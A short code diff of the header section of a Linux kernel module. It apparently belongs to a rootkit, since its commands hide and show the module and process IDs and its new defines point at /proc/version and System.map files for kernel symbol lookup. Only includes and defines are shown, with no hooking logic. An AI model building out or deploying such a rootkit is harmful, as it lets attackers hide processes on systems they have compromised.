@@ -1,12 +1,15 @@
 #include <linux/module.h>
 #include <linux/proc_fs.h>
+#include <asm/paravirt.h>
 #include <asm/uaccess.h>
-#include <sys/syscall.h>
-/* WTF, it compiles without these */
 #include <linux/kernel.h>
-//#include <linux/init.h>
 #include <linux/kobject.h>
-//#include <linux/fs.h>
+#include <linux/init.h>
+#include <linux/unistd.h>
+#include <linux/fs.h>
+#include <linux/slab.h>     /* kmalloc */
+
+/* WTF, it compiles without these */
 //#include <linux/string.h>
 //#include <linux/proc_ns.h>
 //#include <linux/spinlock.h>
@@ -24,6 +27,10 @@ MODULE_LICENSE("GPL");
 #define SHOW_MOD_CMD "show"
 #define HIDE_PID_CMD "hpid"
 #define SHOW_PID_CMD "spid"
+
+#define PROC_V "/proc/version"
+#define BOOT_PATH "/boot/System.map-"
+#define MAX_VERSION_LEN   256
 
 /* Re-writing proc_dir_entry, removed from Linux kernel since 3.10 */
 struct proc_dir_entry {
